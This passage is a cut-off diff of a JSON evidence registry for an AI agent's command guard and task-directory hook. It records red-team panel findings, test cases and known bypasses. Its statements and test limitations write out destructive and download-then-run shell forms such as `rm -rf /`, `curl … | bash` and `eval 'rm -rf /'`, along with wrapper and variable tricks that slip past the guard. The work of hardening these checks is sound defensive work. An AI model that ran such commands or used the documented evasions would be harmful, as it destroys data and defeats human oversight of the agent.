@@ -2052,7 +2052,7 @@
     {
       "id": "PB-TASK-DIR-GUARD",
       "category": "hook-payload-and-paths",
-      "statement": "task-gate-hook refuses a Bash command that creates a task directory by hand inside the project — a `mkdir` naming `.agent[/<lane>]/tasks/…` in any shell spelling the decoder can resolve from the text (quoted, backslash-escaped, `$'…'`, brace-expanded, a glob in the PATH), judged by scripts/task-dir-target.py after the shell's own decoding — allows the same command when every named target is a literal absolute path OUTSIDE the project (a temp fixture), and, once the trigger fires (a `mkdir` word after quote/backslash stripping, a `$'`, or a `{` anywhere in the text), refuses to judge anything but one simple mkdir: a compound command, a pipe, a subshell, a background job, a prefix assignment or an expansion that could repoint the path is blocked, never narrowed. A command NAME that exists only after the shell evaluates it — assembled in a variable (`D=mk; D+=dir; \"$D\" -p …`) or a glob on the binary itself (`/bin/mk?ir`) — is outside the guard, the same architectural bound as PB-COMMAND-DANGEROUS.",
+      "statement": "task-gate-hook refuses a Bash command that creates a task directory by hand inside the project — a `mkdir` naming `.agent[/<lane>]/tasks/…` in any shell spelling the decoder can resolve from the text (quoted, backslash-escaped, `$'…'`, brace-expanded, a glob in the PATH), judged by scripts/task-dir-target.py after the shell's own decoding — allows the same command when every named target is a literal absolute path OUTSIDE the project (a temp fixture), and, once the trigger fires (a `mkdir` word after quote/backslash stripping, a `$'`, or a `{` anywhere in the text), allows a command whose every mkdir word is provably inert — inside masked data (a heredoc a non-shell reads, an echo/printf literal) or among the arguments of a known read/print command (echo, printf, grep, cat, the `tasks` CLI, `git commit/log/show/diff/…` without `-c`), found through command_guard's walker (segments, wrappers, payloads, `sh -c`, eval, `$(…)`, herestrings, `find -exec`); any other command carrying the word, and every command whose NAME is unresolved (`$M`, `$(…)`, a backtick), counts as running it (task 110 and its impl panel round 1), and a mention is inert only while EVERY command of the call is one the helper knows to read, print or write text (a closed list — echo, printf, grep, cat, head, tail, wc, tee, cd, ls, cut, tr, the `tasks` CLI, git's read subcommands — that holds for a tool named bare in the environment the call found: no pager, no sorter, no command with an output-file operand; any environment change in the call — an assignment, a prefix, `printf -v`, an expansion that assigns, an arithmetic expression — takes the whole call off it; a path-qualified name, git and `tasks` count only when the call writes no file, a write being `tee` or any unquoted `>` not aimed at the null device or a descriptor; plus a non-shell interpreter whose program IS a quoted heredoc: given no program by `-c`, `-e`, `-m` or a script operand, its stdin not redirected from elsewhere) — with a shell, a sourcer, a path, or any program the helper does not know in the same call, text that one command writes or prints could be run by another, so the released answer stands (impl panel round 2: the first narrowing allowed a script written through a file-sink heredoc or by echo/printf and then run, a read command's output piped into a shell, and a quoted heredoc whose reader it could not name — a regression against 1.5.45) — and otherwise refuses to judge anything but one simple mkdir: a compound command, a pipe, a subshell, a background job, a prefix assignment or an expansion that could repoint the path is blocked, never narrowed. A word holding an unresolved expansion (a variable, `$(…)`, a backtick, or a shell special parameter such as `$@` — task 110) counts as naming a task dir only when it can still spell one: `tasks` is visible, or an expansion follows the `.ag` hint, or the `.ag` is not a whole `.agent` component — so `\"$N/.agent\"` is allowed (task 110, a regression against 1.5.45) while `.$D/tasks/…` and `.agent/$T/…` are refused. A command NAME that exists only after the shell evaluates it — assembled in a variable (`D=mk; D+=dir; \"$D\" -p …`) or a glob on the binary itself (`/bin/mk?ir`) — is outside the guard, the same architectural bound as PB-COMMAND-DANGEROUS.",
       "owner": [
         {
           "path": "plugins/playbook/scripts/task-gate-hook",
@@ -2154,6 +2154,147 @@
           "limitations": [
             "Task 100 impl panel round 1 (2026-09-27) (codex-high, measured live): `D=mk; D+=dir; \"$D\" -p .agent/tasks/999-x` passes the hook and creates the directory — pinned as the bound, not fixed: blocking every command whose name is a variable would refuse ordinary shell."
           ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardFixBatch110.test_text_that_only_mentions_mkdir_is_not_a_task_dir",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_gate_path_traversal.py",
+            "reference": "TaskDirGuardFixBatch110.test_a_mkdir_that_really_runs_still_blocks"
+          },
+          "limitations": [
+            "Task 110 (parked item 31 / R8): 7 mentions allowed, 17 command positions still refused. Corpus: task-dir refusals 123 → 27 of 3,551 triggered commands after the first narrowing, 123 → 51 after impl panel round 1 made it stricter (`measure/results-round1fix.json`), 0 newly refused either time; the 72 newly allowed are a subset of the 96 reviewed by hand — none creates a task dir (task 110 record, measure/)."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardFixBatch110.test_a_variable_before_a_final_dotagent_is_not_a_task_dir",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_gate_path_traversal.py",
+            "reference": "TaskDirGuardFixBatch110.test_a_variable_that_can_still_complete_a_task_dir_blocks"
+          },
+          "limitations": [
+            "Task 110 (109 G2-02 / R15): a regression against 1.5.45."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardFixBatch110.test_shell_special_parameters_are_unresolved",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "085 round 3 V4 / R8: `.$@/tasks/…`; the widening refused nothing on the corpus."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound1.test_unresolved_heads_and_unmodelled_wrappers_block",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_gate_path_traversal.py",
+            "reference": "TaskDirGuardImplPanelRound1.test_mentions_in_read_print_commands_still_pass"
+          },
+          "limitations": [
+            "Task 110 impl panel round 1 (opus, sol-high): `$M -p`, `\"$(echo mkdir)\" -p`, a backtick head, `busybox mkdir`, `flock … mkdir`, `rg --pre mkdir`, `git -c alias…` — the first narrowing allowed them, 1.5.45 refused (a REGRESSION)."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound1.test_a_shell_heredoc_body_is_a_script_wherever_it_sits",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "A quoted heredoc's reader was taken from the line's FIRST command; `cd x; bash <<'EOF'` and `cat <<'EOF' | bash` keep their body now (a control: the panel-time tree also refused these, my round-1 change must not open them)."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound1.test_a_parallel_too_large_to_enumerate_blocks",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": []
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound2.test_text_one_command_writes_is_not_inert_when_the_call_can_run_it",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_gate_path_traversal.py",
+            "reference": "TaskDirGuardImplPanelRound2.test_a_mention_stays_inert_while_every_command_only_reads_or_prints"
+          },
+          "limitations": [
+            "Task 110 impl panel round 2, class 6 (opus) — a REGRESSION against 1.5.45, measured on three roots (installed 1.5.45, the tree before the task, the panel-time tree): 12 forms refused by the first two and allowed by the third. RED on the panel-time helper: 12 failures; the 6 controls (notes, prints, a record writer, a commit message) pass before and after.",
+            "Corpus (33,782 commands, 3,684 that trigger the guard): refusals 131 (before the task) → 53 (panel time) → 67 on the final code; 0 commands refused that the tree before the task allowed; 14 of the 78 commands the first narrowing let through are refused again, every one refused by the installed 1.5.45 as well (11 run `python3` on a script, a module or `-c` in the same call, 1 pipes through `sed`, 1 is an assignment on its own, 1 is prose lines the walker reads as commands)."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound2.test_a_quoted_heredoc_with_a_reader_the_helper_cannot_name_is_not_data",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "`su -`, `sudo -s` and a program the helper has never heard of reading a quoted heredoc: the body was dropped as data although the reader may run it. 3 failures on the panel-time helper."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound2.test_a_read_command_that_can_be_made_to_run_a_program_is_not_read_only",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "Found by my own review of the first round-2 fix, before the judge: a pager, a sorter and any environment-prefixed command were on the read/print list. 4 failures on that first form, then green."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound2.test_an_interpreter_is_exempt_only_when_its_program_is_the_heredoc",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "Post-D6 run 1 (codex, counted Important): the exemption looked only for a quoted heredoc on the interpreter's line, so an interpreter given its program another way was exempt although the heredoc was only that program's input. 6 failures on the code the judge reviewed; the 6 controls in the same test (the program IS the heredoc) pass before and after."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound2.test_the_read_only_list_holds_only_in_an_unchanged_environment_and_for_bare_names",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "Found by my own review after post-D6 run 1, in the same class as its second finding: a path-qualified name can be the file the call wrote; an assignment, `export` or prefix changes what a listed tool starts; git and `tasks` start configured programs. 8 failures on the code with only the judge's two repairs in, then green."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound2.test_a_write_counts_however_it_is_spelled",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "Post-D6 run 2 (codex, counted Important), repaired as a class: 'the call writes no file' was decided from the output redirections written as their own word. 7 of 9 spellings allowed by the code the judge reviewed; the 3 controls (a redirection that writes no file) pass before and after. The scan errs toward 'writes': a `>` that is no redirection (a `[[ a > b ]]` comparison) counts. Three rows were added by my own review of that repair — a write inside a substitution that itself stands between double quotes — and failed against its first form: every substitution body is scanned as its own text now."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_gate_path_traversal.py",
+          "reference": "TaskDirGuardImplPanelRound2.test_an_environment_change_counts_however_it_is_made",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "Post-D6 run 2 (codex, counted Important), repaired as a class: a listed builtin that sets a variable, an assigning expansion and an arithmetic expression were not seen as environment changes. 5 of 6 forms allowed by the code the judge reviewed; the 3 controls pass before and after. Any `((` in the call counts. Two more arithmetic spellings (the old bracket form, an array subscript) were added by my own review and failed against the first form of the repair."
+          ]
         }
       ],
       "applicable_platforms": [
@@ -2169,7 +2310,10 @@
         "Owner decision 2026-08-21: agent-mode (hook enforcement) is a supported capability on Claude ONLY, so applicable_providers is narrowed to claude here.",
         "Row added by Task 100 (PLAN S8 binding audit, 2026-09-27) for the parked item task 087 → PLAN S8 (task 080 built the S1d narrowing helper; task 085 G2/T2/U3 extended the trigger to shell spellings). Bound: the helper judges the command TEXT before the shell runs it — a mkdir whose target only exists after an earlier step (a symlink planted in the same command) is refused as non-simple rather than resolved; a genuinely new spelling the decoder does not know is refused too (the trigger is loose on purpose: any `mkdir` word, `$'`, or `{` runs the helper, which can only narrow). Hermetic bash subprocess on the CI lanes, not a live provider hook invocation; the ack-free judge-session block (`tasks new|work` from a judge) is PB-JUDGE-READONLY's neighbour, not this row.",
         "Task 100 impl panel round 1 (2026-09-27) NARROWED `in any shell spelling` to `any spelling the decoder can resolve from the text`: two seats showed a computed command NAME (a variable-assembled `\"$D\"`, a glob on the binary `/bin/mk?ir`) is not seen — task-dir-target.py decodes quoting, escapes, `$'…'`, braces and PATH globs, but a name that exists only after evaluation needs the shell's variable environment or filesystem, which a static judge does not have (the same class command_guard pins in TheArchitecturalBound). Both shapes are pinned as ALLOWED so the bound is visible; the OS sandbox is the layer for them.",
-        "Task 100 impl panel round 2 (2026-09-27) (grok): the compound-command clause holds only for text the trigger can see — `D=mk; D+=dir; \"$D\" -p …` contains no `mkdir`, `$'` or `{` after stripping, so the helper never runs and the `;` compound is not judged at all; that is the computed-name bound stated in the statement's last sentence, now made explicit for the compound clause too."
+        "Task 100 impl panel round 2 (2026-09-27) (grok): the compound-command clause holds only for text the trigger can see — `D=mk; D+=dir; \"$D\" -p …` contains no `mkdir`, `$'` or `{` after stripping, so the helper never runs and the `;` compound is not judged at all; that is the computed-name bound stated in the statement's last sentence, now made explicit for the compound clause too.",
+        "Task 110 bound: a mkdir run by a non-shell program from a quoted HEREDOC BODY (`python3 - <<'PY'` with os.system / subprocess) is not seen — the body is data to the guard. A non-shell command whose own words carry the mkdir word (`python3 -c \"…mkdir…\"`, `make … mkdir`) still refuses (impl panel round 1: only known read/print commands make the word inert).",
+        "Task 110 impl panel round 2 bound: the read/print list is CLOSED on purpose. A harmless tool it does not name (`sed`, `awk`, `jq`, a test runner) in the same call as a mention keeps the released refusal when the call also names a task dir; the cost is measured above (14 corpus commands refused again, all refused by 1.5.45). A program a listed command is CONFIGURED to start (a git hook, a pager, the verify command `tasks` runs) is covered inside one call — git, `tasks` and a path-qualified name do not count as read commands when the call writes a file, and an environment change takes the call off the list — but one planted in an EARLIER call is not seen. The two exemptions that remain are the declared ones: a non-shell interpreter reading its PROGRAM from a quoted heredoc is not followed into what that program does, and a file written in one tool call and run in a LATER one is not seen (the guard keeps no state between calls).",
+        "Task 110, review status (2026-10-05): the post-panel single-judge run cap (owner rule D6) was reached after run 2, which counted two Important findings in this helper's read/print list. Both were repaired as classes (`test_a_write_counts_however_it_is_spelled`, `test_an_environment_change_counts_however_it_is_made`), test-pinned, measured on the bash-history corpus and covered by the full verify — but NO judge has reviewed those two repairs. The owner closed the task on 2026-10-05 WITHOUT a third run, by decision: the cap had been reached on a fourth task in a row, each extra run granted before had found new edges in fresh repairs and no Critical, the dangerous-command guard drew no finding in run 2, and a miss in this helper means a task directory created without `tasks new`, not a dangerous command executed. A design item is parked for PLAN S11: detect such a directory after the fact instead of predicting from the command text what a command may start."
       ],
       "follow_up_phases": [],
       "required_live_evidence": [],
@@ -2179,7 +2323,7 @@
     {
       "id": "PB-COMMAND-DANGEROUS",
       "category": "command-safety",
-      "statement": "The command interlock blocks its enumerated high-blast command forms at command position — a position it finds THROUGH delegating wrappers and their options, so `sudo -u root rm -rf /`, `timeout 5 rm -rf /`, `chrt -f 99 rm -rf /`, `stdbuf -o0 git push --force`, `env -S '<command line>'`, a nest of them, and the same wrappers on the right of a pipe (`curl … | nice -n 19 bash`) all reach the same rules as their bare forms, while a wrapper's terminal/query mode (`sudo --version …`, `command -v …`) runs nothing and is allowed — and through a command named by PATH or escaped past an alias, `/bin/rm -rf /` and `\\\\rm -rf /`, whose normalised head is checked in addition to the raw text (task 077) — and, for the two whole-command rules (a downloader piped into a shell, a DB drop/truncate/delete issued to a client), anywhere in what could RUN, with only these inert DATA regions masked first — a `cat`/`tee` heredoc body written to a PLAIN file whose tag is quoted or whose body carries no `$(`/backtick/`${`/process-substitution expansion, and an echo/printf LINE redirected to a plain file with no pipe or expansion anywhere on it — so a `cat` fixture or note ABOUT such a command is data, not a command, while a heredoc fed to an interpreter or DB client, `tee >(sh)`, `echo … | sh`, an expansion, an unterminated heredoc, a `<<` inside a string, or a quoted pipe inside an echo argument are all still seen (task 073; the command-position rules are line-split and never masked) — allows the documented benign look-alikes, and lets an explicitly acknowledged command through, where acknowledgement means either an ACTIVE task whose live `## Status` is `in_progress` and whose live `## Risk` reads `irreversible` (resolved through this session's `current_state` and the CLI's fence-aware `extract_risk`) or PLAYBOOK_ALLOW_DANGEROUS set to 1/true/yes in the HOOK'S OWN environment by the operator (a command-line prefix typed by the agent cannot set it — the block message says so).",
+      "statement": "The command interlock blocks its enumerated high-blast command forms at command position — a position it finds THROUGH delegating wrappers and their options, so `sudo -u root rm -rf /`, `timeout 5 rm -rf /`, `chrt -f 99 rm -rf /`, `stdbuf -o0 git push --force`, `env -S '<command line>'`, a nest of them, and the same wrappers on the right of a pipe (`curl … | nice -n 19 bash`) all reach the same rules as their bare forms, while a wrapper's terminal/query mode (`sudo --version …`, `command -v …`) runs nothing and is allowed — GNU `parallel` as the jobs it would RUN — each input argument appended to the template or substituted WHOLE for `{}`, `{1}` or an `-I`/`--replace` string, the product of several `:::` sources, an EMPTY template whose arguments are themselves the commands, its options read from GNU parallel's own option spec and, where that spec leaves the grammar open (an optional value, an option the table does not know), judged under EVERY reading, its template judged both dequoted and with its quoting kept, every job of the source product judged one by one and the invocation REFUSED (`parallel-too-many-jobs`) past 512 job lines rather than sampled (task 110 and its impl panel round 1: `parallel rm -rf ::: /etc /usr` reached the rules as `rm -rf /etc` again, as 1.5.45 read it), and, where GNU parallel REWRITES its arguments in a way the guard does not model — an option listed as data in command_guard.py (a column or record split, several arguments in one job line, further replacement strings; a renamed source separator or a replacement string of the user's own, after which the template cannot be located) or a replacement string that rewrites its argument — judged by the command NAMES in its template alone and REFUSED (`parallel-unmodelled-arguments`) when one of them is a name a rule judges by its arguments (`rm`, `git`, `dd`, a shell, a database client) or cannot be read (no template, a replacement string where the name should be, a line a wrapper re-parses with an argument in it, a hidden template), an ordinary command passing as before (owner ruling 2026-10-05 after impl panel round 2: that grammar is not modelled), a runner the download-then-run rule judges by its operand (an interpreter, a sourcer) being refused in such a template as `download-then-run` once a download precedes it in the same command — `eval` as its dequoted arguments joined with spaces, a redirection of eval itself not being one of them, and the `&` of a redirection operator (`2>&1`, `&>f`) never splitting a command (task 110: `eval 'rm -rf /' < /dev/null` was allowed by 1.5.45 and the candidate), and through a command named by PATH or escaped past an alias, `/bin/rm -rf /` and `\\\\rm -rf /`, whose normalised head is checked in addition to the raw text (task 077) — and, for the two whole-command rules (a downloader piped into a shell, a DB drop/truncate/delete issued to a client), anywhere in what could RUN, with only these inert DATA regions masked first — a `cat`/`tee` heredoc body written to a PLAIN file whose tag is quoted or whose body carries no `$(`/backtick/`${`/process-substitution expansion, and an echo/printf LINE redirected to a plain file with no pipe or expansion anywhere on it — so a `cat` fixture or note ABOUT such a command is data, not a command, while a heredoc fed to an interpreter or DB client, `tee >(sh)`, `echo … | sh`, an expansion, an unterminated heredoc, a `<<` inside a string, or a quoted pipe inside an echo argument are all still seen (task 073; the command-position rules are line-split and never masked) — and, since task 110 (owner decision Q-B (b), after measuring 0 refusals of 282 downloader commands in the owner's bash history), a downloader that writes a file in one segment followed by a later part of the SAME command that runs it — directly by the path as written, as a shell or interpreter operand, on its stdin, or inside a wrapper, `eval`, `parallel` or `sh -c` payload — (`curl -o x.sh URL && sh x.sh`, `wget URL/i.sh; bash i.sh`, `./install` after `curl -O`) — judged on shell segments and their payloads, not inside the body of a quoted heredoc a non-shell program reads and not inside a command-substitution body — allows the documented benign look-alikes, and lets an explicitly acknowledged command through, where acknowledgement means either an ACTIVE task whose live `## Status` is `pending` (what every `tasks work N` activation leaves — the CLI writes the pointer, not the status) or `in_progress`, never `done`/`blocked` nor a stub (task 110 W9), and whose live `## Risk` reads `irreversible` (resolved through the session the CLI and hooks RESOLVE — with or without `PLAYBOOK_SESSION_ID`, the same identity rule as task 106, on every platform: on Windows that is the env id or the shared `pid-win-fallback` — its `current_state` in the lane the ENFORCING resolver names, never the root lane for a malformed marker or the fresh-clone shape, and the CLI's fence-aware `extract_risk`; logged as `allow ack-irreversible-task:<rule>`) or PLAYBOOK_ALLOW_DANGEROUS set to 1/true/yes/on in the HOOK'S OWN environment by the operator (logged as `allow ack-operator-env:<rule>` for a command that would have blocked — task 110) (a command-line prefix typed by the agent cannot set it — the block message says so). The GNU parallel composition and the download-then-run rule are HEURISTICS over one command's text; what they do not cover is listed under this row's limitations, and for a command whose danger the text does not reveal the real boundary is the OS sandbox, not this interlock.",
       "owner": [
         {
           "path": "plugins/playbook/scripts/command_guard.py",
@@ -2294,7 +2438,7 @@
             "reference": "GuardAckHygiene.test_falsey_env_values_do_not_acknowledge"
           },
           "limitations": [
-            "Round 2 (codex-high): a crash between `done` and the pointer clear must not leave every dangerous command auto-allowed — the ack requires a live `in_progress` status; and `PLAYBOOK_ALLOW_DANGEROUS=0`/`false`/`no`/empty are not acknowledgements. DISCLOSED BOUND (grok, codex-medium): the in-session ack rests on the task record the agent itself writes (`## Risk: irreversible`) — that is the owner's documented process (classify before work, with a rollback plan), not a separate human confirmation; the operator env var is the human-only path."
+            "Round 2 (codex-high): a crash between `done` and the pointer clear must not leave every dangerous command auto-allowed — the ack requires a live `in_progress` status (task 110 W9: `pending` or `in_progress` — `in_progress` alone never matched a normally activated task, which the CLI leaves `pending`; `done`, `done (…)`, `blocked` and a stub still refuse); and `PLAYBOOK_ALLOW_DANGEROUS=0`/`false`/`no`/empty are not acknowledgements. DISCLOSED BOUND (grok, codex-medium): the in-session ack rests on the task record the agent itself writes (`## Risk: irreversible`) — that is the owner's documented process (classify before work, with a rollback plan), not a separate human confirmation; the operator env var is the human-only path."
           ]
         },
         {
@@ -2874,6 +3018,298 @@
           "limitations": [
             "Task 100 (PLAN S8 binding audit, 2026-09-27): the FENCED `## Risk` irreversible decoy the acknowledgement must ignore was described in a limitation but cited by no proof; bound here."
           ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelInputArgumentsReachThePayload.test_appended_and_substituted_arguments_block",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "ParallelInputArgumentsReachThePayload.test_benign_twins"
+          },
+          "limitations": [
+            "Task 110, S11 G2-01 — a REGRESSION against 1.5.45 found live by the 109 gauntlet (step H24): 11 shapes (append, multi-source product, `{}`/`{1}`, `-I`, `--replace=`, `:::+`) RED → green.",
+            "Corpus (owner's bash history, 32,997 unique commands): 4 newly refused, all python record writers whose prose quotes the vector inside a program heredoc — refused by the installed 1.5.45 too."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelInputArgumentsReachThePayload.test_an_empty_template_runs_each_argument",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "ParallelInputArgumentsReachThePayload.test_benign_twins"
+          },
+          "limitations": [
+            "085 round 3 V2: `parallel ::: 'rm -rf /'` — GNU parallel runs each argument as a command when no template is given."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ParallelInputArgumentsReachThePayload.test_value_taking_options_do_not_become_the_template",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "085 round 3 V6: 25 value-taking options (`--results out`, `--joblog`, `--tmpdir`, `-a`, `-S`, `--colsep` …) no longer read their value as the template."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "SuSupplementaryGroupTakesAValue.test_blocks",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "SuSupplementaryGroupTakesAValue.test_benign_twins"
+          },
+          "limitations": [
+            "085 round 3 V3: `--supp-group VALUE` on su/runuser."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "EvalJoinsItsArgumentsAroundRedirections.test_blocks",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "EvalJoinsItsArgumentsAroundRedirections.test_benign_twins"
+          },
+          "limitations": [
+            "Found by task 110's own corpus review: a redirection of eval made any quoted command invisible (1.5.45 and the candidate allowed `eval 'rm -rf /' < /dev/null`)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "DownloadThenRunAcrossSegments.test_blocks",
+          "boundary": "unit",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "DownloadThenRunAcrossSegments.test_benign_twins"
+          },
+          "limitations": [
+            "Owner Q-B (b): shipped after the measurement in task 110's record (measure/results-download-then-run.json): prototype 0, unrestricted 1 (a python record writer, via the substitution-scan quirk below), shipped form 0 of 282 downloader commands / 0 of 32,997."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_command_guard.py",
+          "reference": "OperatorAcknowledgementIsJournalled.test_env_ack_writes_an_allow_line_naming_the_rule",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "OperatorAcknowledgementIsJournalled.test_env_ack_on_a_harmless_command_writes_nothing"
+          },
+          "limitations": [
+            "Task 110 (109 G2-14): the operator acknowledgement is decided after classification and journalled; `on` and a padded `ON` are exercised (`test_every_documented_ack_spelling_is_journalled`)."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_command_guard.py",
+          "reference": "IrreversibleAckReadsTheResolvedSession.test_no_env_id_an_irreversible_task_acknowledges",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "IrreversibleAckReadsTheResolvedSession.test_no_env_id_other_risks_and_states_still_block"
+          },
+          "limitations": [
+            "Owner Q-A (b) / parked R1 + P1: no env id (every real hook process, 109 K10) → the walk's session; the journal row carries `ack-irreversible-task:git-push-force` and a `pid-` session id. Malformed marker and fresh-clone shape refuse (`test_a_malformed_marker_never_falls_back_to_the_root_lane`, `test_the_fresh_clone_shape_never_acknowledges`). POSIX only — Windows keeps the raw env id."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_command_guard.py",
+          "reference": "GauntletHookStepsAsVectors.test_each_step_on_the_candidate",
+          "boundary": "subprocess",
+          "negative_control": null,
+          "limitations": [
+            "The 109 gauntlet's Round-2 hook steps H01-H51 (43 rows) replayed through the tree's real hook scripts, the installed 1.5.45 result recorded per row as data; rows another S11 group owns are marked `open:`."
+          ]
+        },
+        {
+          "type": "executable integration",
+          "path": "tests/test_command_guard.py",
+          "reference": "IrreversibleAckReadsTheResolvedSession.test_a_freshly_activated_pending_task_acknowledges",
+          "boundary": "subprocess",
+          "negative_control": {
+            "path": "tests/test_command_guard.py",
+            "reference": "IrreversibleAckReadsTheResolvedSession.test_no_env_id_other_risks_and_states_still_block"
+          },
+          "limitations": [
+            "Task 110 W9, found by the live re-run (step X28: the fresh feature task 003, activated by the real `tasks work 3`, read `## Status: pending` — the installed 1.5.45 blocked it, the 109 H28 passed because that run's task 003 already read `in_progress` when H03 activated it, as H03's own output shows). RED with and without an env id (record measure/red-W9-pending.txt)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ImplPanelRound1Bypasses.test_parallel_options_read_from_its_own_spec",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Task 110 impl panel round 1 (opus, grok): `--plus` is a flag (1.5.45 blocked `parallel --plus rm -rf / ::: x`, the first candidate allowed it); `--replace`/`-i` take an optional value; `--filter`/`--compress-program`/`--sql` take one. The spec read is the `GetOptions` table of GNU parallel's source (20150329 mirror) plus later releases' value options; an option no table knows is judged as flag AND as value option. The benign twins in the same test are the negative control."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ImplPanelRound1Bypasses.test_every_job_is_judged_or_the_invocation_is_refused",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Impl panel round 1 (opus, sol-high, sol-medium, grok): the fallback past 64 jobs sampled 256 single arguments — an argument past the slice or a pair only the full product forms was never judged (a REGRESSION for `parallel rm -rf ::: a0…a299 /`). Jobs are the product of DISTINCT source values; past 512 job lines the invocation blocks as `parallel-too-many-jobs` (asserted), and `parallel gzip ::: <400 files>` (one source, distinct) is judged and allowed."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ImplPanelRound1Bypasses.test_a_shell_word_template_keeps_its_quoting",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Impl panel round 1 (sol-high): `parallel bash -c 'rm -rf /' ::: a` — a REGRESSION against 1.5.45."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ImplPanelRound1Bypasses.test_a_redirection_of_eval_never_swallows_its_argument",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Impl panel round 1 (sonnet): `eval 2>&1 'rm -rf /'` was allowed by 1.5.45 and the candidate — the segment splitter cut at the `&` of `2>&1`. The allow twin `eval 'echo hi' 2>&1 'rm -rf /'` pins bash's join semantics (it runs `echo hi rm -rf /`)."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "ImplPanelRound1Bypasses.test_download_then_run_is_followed_into_what_a_segment_runs",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Impl panel round 1 (sol-high, sol-medium, grok): `bash -c 'sh x.sh'`, `eval 'bash x.sh'`, `bash < x.sh`, `/tmp/x.sh` (and under sudo/env/command) after a download — 9 forms, rule asserted; reading the file (`jq`, `cat`) stays allowed."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
+          "reference": "AcknowledgementOnWindowsUsesTheResolvedSession.test_no_env_id_reads_the_pid_win_fallback_pointer",
+          "boundary": "unit",
+          "negative_control": null,
+          "limitations": [
+            "Impl panel round 1 (sol-high, `[SETTLED-CONTRADICTED]` against owner Q-A (b)). An in-process simulation (the guard's `os` reads `nt`, the CLI's `sys.platform` `win32`); the real Windows lane runs the rest of the suite in CI."
+          ]
+        },
+        {
+          "type": "executable unit",
+          "path": "tests/test_command_guard.py",
